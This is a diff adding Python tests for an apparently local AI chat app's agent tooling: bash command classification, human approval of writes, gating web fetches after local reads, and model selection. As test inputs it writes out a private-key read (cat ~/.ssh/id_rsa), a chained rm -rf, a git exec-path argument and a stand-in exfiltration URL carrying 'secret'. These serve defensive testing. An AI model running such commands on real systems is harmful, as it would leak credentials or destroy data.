@@ -1,6 +1,8 @@
 """问 AI: tools over local data, the tool loop, history replay and frame serving."""
 import json
+import shutil
 
+import pytest
 from fastapi.testclient import TestClient
 
 from app import chat
@@ -47,7 +49,7 @@ def test_large_results_are_truncated_with_a_hint():
 
 def _fake_stream(script):
     """Replace the model: each call pops the next scripted assistant message."""
-    def f(messages, tools=True):
+    def f(messages, tools=True, model_id=None):
         msg = script.pop(0)
         if msg.get("content"):
             yield "delta", msg["content"]
@@ -184,3 +186,89 @@ def test_missing_screencast_portal_is_named_and_restart_fixes_the_portal_first(t
     assert calls == [["systemctl", "--user", "restart", "xdg-desktop-portal.service"],
                      ["systemctl", "--user", "restart", "screenpipe.service"]]
     chat._SP_STATUS.update(at=0, v=None, restarted_at=0)
+
+
+@pytest.mark.skipif(not shutil.which("bash"), reason="run_bash needs bash")
+def test_read_only_bash_runs_but_writes_wait_for_approval(env, monkeypatch, tmp_path):
+    from app import localtools
+    monkeypatch.setattr(localtools, "sandbox_available", lambda: True)
+    assert localtools.classify("git log --oneline | head -3") == ""
+    assert localtools.classify("sort -oout x") and localtools.classify("git --exec-path=/x log")
+    assert localtools.classify("ls && rm -rf x")
+    assert localtools.classify("echo x > f")
+    assert localtools.classify("cat ~/.ssh/id_rsa")
+    target = tmp_path / "made"
+    calls = [{"id": "r", "type": "function", "function": {"name": "run_bash", "arguments": json.dumps(
+        {"command": "touch made", "cwd": str(tmp_path)})}}]
+    for allow in (False, True):
+        monkeypatch.setattr(chat, "_stream", _fake_stream([
+            {"role": "assistant", "content": "", "tool_calls": calls}, {"role": "assistant", "content": "好"}]))
+        gen = chat.ask("建个文件")
+        evs = []
+        for e in gen:
+            evs.append(e)
+            if e["type"] == "approval":
+                assert e["command"].startswith("touch") and e["reason"]
+                assert chat.approve(e["token"], allow)
+        done = next(e for e in evs if e["type"] == "step_done")
+        assert target.exists() is allow
+        assert bool(done["error"]) is not allow
+    assert not chat.approve("nope", True)
+
+
+def test_selected_days_go_into_the_prompt(env):
+    _seed()
+    p = chat.system_prompt({"tab": "今日", "day": DAY, "days": [DAY, "2026-10-05", "bad"]})
+    assert "选中的 2 天" in p and f"- {DAY}" in p and "- 2026-10-05" in p
+    assert f"选中日期 {DAY}" not in p
+
+
+def test_web_after_local_reads_needs_approval_and_sandbox_flag_is_ignored(env, monkeypatch, tmp_path):
+    from app import localtools
+    monkeypatch.setattr(localtools, "sandbox_available", lambda: True)
+    seen = {}
+    monkeypatch.setattr(localtools, "run_bash", lambda **a: seen.update(a) or {"summary": "ok"})
+    monkeypatch.setattr(localtools, "web_fetch", lambda **a: {"summary": "fetched"})
+    monkeypatch.setitem(chat.IMPL, "run_bash", localtools.run_bash)
+    monkeypatch.setitem(chat.IMPL, "web_fetch", localtools.web_fetch)
+    bash = {"id": "b", "type": "function", "function": {"name": "run_bash", "arguments": json.dumps(
+        {"command": "ls", "sandbox": False})}}
+    fetch = {"id": "w", "type": "function", "function": {"name": "web_fetch", "arguments": json.dumps(
+        {"url": "https://example.com/?d=secret"})}}
+    monkeypatch.setattr(chat, "_stream", _fake_stream([
+        {"role": "assistant", "content": "", "tool_calls": [bash]},
+        {"role": "assistant", "content": "", "tool_calls": [fetch]}, {"role": "assistant", "content": "完"}]))
+    evs = []
+    for e in chat.ask("看看"):
+        evs.append(e)
+        if e["type"] == "approval":
+            chat.approve(e["token"], False)
+    assert "sandbox" not in seen                                   # read-only ls ran sandboxed (default)
+    ap = [e for e in evs if e["type"] == "approval"]
+    assert len(ap) == 1 and ap[0]["command"].startswith("web_fetch")
+
+
+def test_model_must_be_one_of_the_offered(env, monkeypatch):
+    monkeypatch.setitem(chat.config.CHAT, "models", ["kimi-k3", "kimi-k3", ""])
+    assert chat.models() == [chat.model(), "kimi-k3"]
+    used = []
+    monkeypatch.setattr(chat, "_stream", lambda m, tools=True, model_id=None: (
+        used.append(model_id), (yield "message", {"role": "assistant", "content": "好"}))[0])
+    assert [e["type"] for e in chat.ask("hi", model_id="kimi-k3")][-1] == "done" and used == ["kimi-k3"]
+    evs = list(chat.ask("hi", model_id="gpt-x"))
+    assert evs[0]["type"] == "error" and len(used) == 1
+
+
+def test_set_default_model_persists_locally(env, monkeypatch, tmp_path):
+    local = tmp_path / "config.local.json"
+    local.write_text(json.dumps({"classification": {"x": 1}}), encoding="utf-8")
+    monkeypatch.setattr(chat.config, "WEB_LOCAL_CONFIG", local)
+    monkeypatch.setattr(chat.config, "CHAT", {**chat.config.CHAT, "models": ["kimi-k3"]})
+    base = chat.base_model()
+    assert chat.model() == base
+    assert not chat.set_default("gpt-x")
+    assert chat.set_default("kimi-k3") and chat.model() == "kimi-k3"
+    saved = json.loads(local.read_text(encoding="utf-8"))
+    assert saved == {"classification": {"x": 1}, "chat": {"default": "kimi-k3"}}
+    chat.config.CHAT["models"] = []            # no longer offered: falls back
+    assert chat.model() == base
